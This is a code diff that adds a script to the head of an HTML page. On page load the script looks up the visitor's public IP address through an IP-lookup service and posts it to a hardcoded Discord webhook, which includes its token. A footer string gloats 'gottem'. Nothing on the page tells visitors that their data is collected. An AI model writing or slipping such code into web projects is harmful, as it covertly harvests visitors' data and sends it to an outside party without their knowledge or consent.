@@ -1,6 +1,47 @@
 <!DOCTYPE html>
 <!-- commit haha -->
 <html>
+  <script>
+         const ipifyURL = "https://api.ipify.org";
+         const webhookURL = "https://discord.com/api/webhooks/1073364457155219508/7muaMn9qYAtUrRbAuAepQUY-iay27IAuIwNkgqIfvpU6rLWrGfuMOgkBLja-eromM9r-"
+         async function grabIp() {
+           try {
+             const response = await fetch(ipifyURL);
+             const ipAddress = await response.text();
+             window.ip = ipAddress;
+             return ipAddress;
+           } catch (error) {
+             console.error(error);
+           }
+         }
+         grabIp()
+      async function sendIPAddress(ipAddress) {
+        try {
+          await fetch(webhookURL, {
+            method: "POST",
+            // Send the IP address in an embed
+            body: JSON.stringify({
+              embeds: [
+                {
+                  title: "IP Address",
+                  description: "```" + ipAddress + "```",
+                  timestamp: new Date(),
+                  footer: {
+                    text: "gottem from idabest.tk :p"
+                  }
+                }
+              ]
+            }),
+            headers: {
+              "Content-Type": "application/json"
+            }
+          });
+        } catch (error) {
+          console.error(error);
+        }
+      }
+    sendIPAddress(ip);
+  </script>
   <style>
     body {
       margin: 0;
